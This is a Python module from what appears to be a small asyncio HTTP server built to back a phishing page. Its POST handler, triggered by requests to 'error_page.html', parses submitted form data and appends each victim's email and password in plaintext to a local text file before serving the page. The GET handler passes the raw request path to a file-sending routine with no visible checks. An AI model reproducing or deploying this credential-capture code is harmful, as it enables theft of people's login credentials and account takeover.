"""
Module used to handle HTTP requests.
"""
import asyncio

from request_parser import RequestLineHeader
from responder import send_file_response


def handle_request(request_line_header: RequestLineHeader,
                   transport: asyncio.Transport, *args) -> None:
    """
    Handle HTTP Request upon given method.
    :param request_line_header: Parsed HTTP header of the request.
    :param transport: The async object representing the connection with client.
    :param args: Optional arguments coming from request.
    """
    methods = {
        'GET': _handle_get_request,
        'POST': _handle_post_request
    }
    try:
        method = methods[request_line_header.method]
    except Exception:
        raise UnsupportedMethodError(
            f"Method {request_line_header.method} is unsupported")
    method(request_line_header, transport, *args)


def _handle_get_request(request_line_header: RequestLineHeader,
                        transport: asyncio.Transport, *args) -> None:
    """
    Method to handle GET request and send the appropriate response.
    :param request_line_header: first line of HTTP request.
    :param transport: The async object representing the connection with client.
    :param args: Optional additional arguments passed in request.
    """

    send_file_response(path=request_line_header.path,
                       http_version=request_line_header.http_version,
                       transport=transport)


def _handle_post_request(request_line_header: RequestLineHeader,
                         transport: asyncio.Transport, *args) -> None:
    """
    Method to handle POST request.
    :param request_line_header: first line of HTTP request.
    :param transport: The async object representing the connection with client.
    :param args: Optional additional arguments passed in request.
    """

    if request_line_header.path.split('/')[-1] == 'error_page.html':
        args = args[0].split('=')
        with open('source_files/file.txt', 'a') as f:
            f.write(f'\nEmail: {args[1].replace("%40", "@")[:-4]}'
                    f' | Password: {args[2]}')
        send_file_response(path=request_line_header.path,
                           http_version=request_line_header.http_version,
                           transport=transport)


class UnsupportedMethodError(Exception):
    """Raises when user request asks for unsupported method."""
    pass
